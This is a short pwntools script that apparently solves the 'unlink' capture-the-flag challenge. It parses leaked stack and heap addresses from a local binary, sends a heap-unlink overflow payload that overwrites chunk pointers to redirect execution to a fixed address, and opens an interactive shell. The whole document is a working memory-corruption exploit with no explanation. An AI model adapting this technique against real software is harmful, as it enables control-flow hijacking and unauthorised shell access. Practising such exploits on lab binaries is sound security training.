from pwn import *

p = process('./unlink')

p.recvuntil('here is stack address leak: ')
addr_stack = int(p.recvline(0),16)

p.recvuntil('here is heap address leak: ')
addr_heap = int(p.recvline(0), 16)

print p.recvline()

payload = p32(0x080484eb)
payload += "a"*12
payload += p32(addr_heap+12)
payload += p32(addr_stack+0x10)

p.send(payload)
p.interactive()
